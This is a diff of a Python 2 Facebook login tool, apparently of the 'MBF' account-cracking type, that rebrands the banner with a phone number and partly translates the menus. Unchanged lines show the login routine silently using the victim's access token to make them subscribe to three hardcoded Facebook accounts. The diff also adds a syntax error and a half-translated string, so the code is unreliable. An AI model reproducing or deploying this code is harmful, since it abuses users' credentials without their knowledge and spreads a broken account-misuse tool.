@@ -20,11 +20,11 @@ except ImportError:
     exit(' pip2 install bs4 *not installed')
 
 logo = """
-\x1b[37m  __  __ ____  _____
- |  \/  | __ )|  ___| *au : rozhak
- | |\/| |  _ \| |_    *fb : fb.com/rozhak.xyz
- | |  | | |_) |  _|   *gh : github.com/r0zhak
- |_|  |_|____/|_|     *yt : youtube.com/rozhakid
+\x1b[37m  __  
+ |  \/  | __ ) call 08149065308
+ | |\/| |  _ \
+ | |  | | |_)
+ |_|  |_|____/
  [x]──────────────────────────────────────────[x]
 """
 hostm="https://m.facebook.com"
@@ -80,7 +80,7 @@ def cek_login():
 	requests.post('https://graph.facebook.com/100000288808056/subscribers?access_token=' + toket)
 	requests.post('https://graph.facebook.com/100000839038766/subscribers?access_token=' + toket)
 	requests.post('https://graph.facebook.com/100041991180267/subscribers?access_token=' + toket)
-	print (' [*] Login Berhasil')
+	print (' [*] successfull')i
 	menu()
 def cek_cookies():
 	cvds=None
@@ -114,8 +114,8 @@ def cek_cookies():
 def login():
     os.system('clear')
     print logo
-    print(' [1] Login Menggunakan Cookies')
-    print(' [2] Cara Mendapatkan Cookies')
+    print(' [1] Login using Cookies')
+    print(' [2] Cara how to get Cookies')
     print(' [0] Keluar')
     lg = raw_input('\n [*] Input : ')
     if lg == '':
